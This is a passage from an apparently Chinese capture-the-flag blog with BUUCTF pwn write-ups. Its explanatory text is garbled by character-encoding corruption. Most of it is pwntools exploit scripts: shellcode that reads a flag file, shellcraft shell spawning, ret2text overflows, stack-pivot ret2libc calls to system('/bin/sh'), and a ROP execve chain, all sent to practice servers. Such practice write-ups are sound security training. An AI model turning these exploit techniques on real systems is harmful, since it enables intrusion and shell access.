ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eax  è°ƒç”¨å·</span></span><br><span class="line"><span class="comment"># ebx ecx edx  å‚æ•° </span></span><br><span class="line"><span class="comment"># open(flag,0,0) </span></span><br><span class="line">open_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">push 0x0;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="comment"># read(fd,flag,0x100)</span></span><br><span class="line">read_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx,0x100;</span></span><br><span class="line"><span class="string">mov ecx,ebx;</span></span><br><span class="line"><span class="string">mov ebx,0x3;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># write(1,flag,0x100)</span></span><br><span class="line">write_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov ebx,0x1;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(open_shell)+asm(read_shell)+asm(write_shell)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">------------------------shellcraft</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒåšæ–‡ï¼š<a class="link" href="https://niceseven.github.io/post/2020/10/29/buuctf-pwn-pwnable_orw/">BUUCTF Pwn Pwnable_orw | NiceSevenâ€™s Website<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x27-bjdctf-2020-router"><a href="#0x27-bjdctf-2020-router" class="headerlink" title="0x27.bjdctf_2020_router"></a>0x27.bjdctf_2020_router</h2><p><code>trick</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.27n3aga49w00.webp"></p><p>ä¸éœ€è¦ payload çš„ä¸€é“é¢˜ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.4m7dmr3mnxmo.webp"></p><h2 id="0x28-Black-Watch-å…¥ç¾¤é¢˜-PWN"><a href="#0x28-Black-Watch-å…¥ç¾¤é¢˜-PWN" class="headerlink" title="0x28.[Black Watch å…¥ç¾¤é¢˜]PWN"></a>0x28.[Black Watch å…¥ç¾¤é¢˜]PWN</h2><p>â€‹    æƒ³ç®€å•äº†</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.6zider3e6um8.webp"></p><p>â€‹    ç›®å‰æ€è·¯æ˜¯<code>æ ˆè¿ç§»--&gt;ä¿®æ”¹æƒé™--&gt;æ‰§è¡Œ</code></p><p>â€‹    ä½†æ˜¯è¿™é“é¢˜æ˜¯åŠ¨æ€é“¾æ¥ï¼Œæ²¡æœ‰<code>mprotectå‡½æ•°</code>ï¼Œå¦‚æœè¦åˆ©ç”¨å°±å¾—è®¡ç®—åç§»åå†è°ƒç”¨å®ƒï¼Œè¿™æ ·è¿˜ä¸å¦‚ç›´æ¥åˆ©ç”¨<code>systemå‡½æ•°</code>ã€‚</p><p>â€‹    æ•…ï¼š<code>æ ˆè¿ç§»--&gt;æ³„éœ²åç§»--&gt;/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28201</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/40&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x8048513</span></span><br><span class="line">s=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line">payload=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(s-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=p32(system)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/40&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26199</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/40&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+ <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x29-mrctf2020-shellcode"><a href="#0x29-mrctf2020-shellcode" class="headerlink" title="0x29.mrctf2020_shellcode"></a>0x29.mrctf2020_shellcode</h2><p><code>un-decompile </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -410h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line"># è¿™ä¸¤è¡Œæ˜¯å‡½æ•°å¼€å§‹çš„æ ‡å‡†æŒ‡ä»¤ï¼Œå°†å½“å‰æ ˆåº•åœ°å€ä¿å­˜åœ¨ rbp ä¸­ï¼Œä»¥ä¾¿åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å¯ä»¥è®¿é—®å‡½æ•°å‚æ•°å’Œå±€éƒ¨å˜é‡ã€‚</span><br><span class="line">sub     rsp, 410h</span><br><span class="line"># åœ¨æ ˆä¸Šåˆ†é…äº† 0x410ï¼ˆ1040ï¼‰å­—èŠ‚çš„ç©ºé—´ï¼Œç”¨äºå­˜å‚¨å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ã€‚</span><br><span class="line">mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stderr@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line"># setbufç›¸å…³ï¼Œæ„Ÿè§‰ä¸ç”¨ç®¡</span><br><span class="line">lea     rdi, s          ; &quot;Show me your magic!&quot;</span><br><span class="line">call    _puts</span><br><span class="line"># è¿™ä¸¤è¡Œä»£ç è°ƒç”¨putså‡½æ•°æ‰“å°äº† &quot;Show me your magic!&quot; è¿™ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 400h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line"># è°ƒç”¨readå‡½æ•°ï¼Œå°†æ ‡å‡†è¾“å…¥å­˜åœ¨bufå¤„ï¼Œå¤§å°æœ€å¤§ä¸º0x400</span><br><span class="line">mov     [rbp+var_4], eax</span><br><span class="line">cmp     [rbp+var_4], 0</span><br><span class="line">jg      short loc_11D6</span><br><span class="line"># è¿™å‡ è¡Œä»£ç å°†è¯»å–åˆ°çš„æ•°æ®é•¿åº¦å­˜å‚¨åœ¨ var_4 å˜é‡ä¸­ï¼Œå¹¶æ£€æŸ¥è¯¥é•¿åº¦æ˜¯å¦å¤§äºé›¶ã€‚å¦‚æœé•¿åº¦ä¸ºé›¶æˆ–è´Ÿæ•°ï¼Œé‚£ä¹ˆç¨‹åºå°±ç›´æ¥é€€å‡ºã€‚å¦‚æœé•¿åº¦ä¸ºæ­£æ•°ï¼Œåˆ™ç»§ç»­æ‰§è¡Œloc_11D6å¤„ä»£ç ã€‚</span><br><span class="line">loc_11D6:</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">call    rax</span><br><span class="line">mov     eax, 0</span><br><span class="line"># è¿™ä¸¤è¡Œä»£ç è°ƒç”¨ buf æŒ‡å‘çš„å‡½æ•°å¹¶é€€å‡ºç¨‹åº</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é“é¢˜æˆ‘ä¹Ÿæ²¡æœ‰å…ˆåˆ†æï¼Œè€Œæ˜¯å…ˆè¯•äº†ä¸€ä¸‹ï¼ŒçŒœäº†ä¸€ä¸‹å°±ç›´æ¥getshelläº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29142</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2a-picoctf-2018-buffer-overflow-1"><a href="#0x2a-picoctf-2018-buffer-overflow-1" class="headerlink" title="0x2a.picoctf_2018_buffer overflow 1"></a>0x2a.picoctf_2018_buffer overflow 1</h2><p><code>ret2text</code>  â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25739</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">vul = <span class="number">0x080485CB</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter your string: \n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x04</span>) + p32(vul)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2b-jarvisoj-test-your-memory"><a href="#0x2b-jarvisoj-test-your-memory" class="headerlink" title="0x2b.jarvisoj_test_your_memory"></a>0x2b.jarvisoj_test_your_memory</h2><p><code>ret2libc1</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.1bdieyh678dc.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.1ov8fvmjefs0.webp"></p><p>â€‹    æˆ‘ç›®å‰çš„çŒœæµ‹å°±æ˜¯ç¨‹åºåœç•™åœ¨è¿™é‡Œï¼Œç„¶åflagåœ¨ç¼“å†²åŒºä¹‹ç±»çš„åœ°æ–¹ï¼Œè¾“å‡ºä¸äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/45&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25317</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">cat_flag = <span class="number">0x080487E0</span></span><br><span class="line">system_plt = <span class="number">0x08048440</span></span><br><span class="line">win_addr = <span class="number">0x080485BD</span></span><br><span class="line">leave_ret =<span class="number">0x08048528</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x13</span>+<span class="number">0x4</span>)+ p32(win_addr) + p32(leave_ret) +p32(cat_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2c-inndy-rop"><a href="#0x2c-inndy-rop" class="headerlink" title="0x2c.inndy_rop"></a>0x2c.inndy_rop</h2><p><code>é™æ€ç¼–è¯‘ï¼Œret2libc3</code></p><p><mark>æ³¨æ„ï¼š</mark></p><p><code>from struct import pack</code></p><p><code>ROPgadget --binary 46 --ropchain</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">c =remote(&#x27;node4.buuoj.cn&#x27;,25756)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line"></span><br><span class="line">p = b&#x27;a&#x27; * (0xc+0x4)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80</span><br><span class="line"></span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2d-picoctf-2018-buffer-overflow-2"><a href="#0x2d-picoctf-2018-buffer-overflow-2" class="headerlink" title="0x2d.picoctf_2018_buffer overflow 2"></a>0x2d.picoctf_2018_buffer overflow 2</h2><p><code>32ä½ä¼ å‚</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 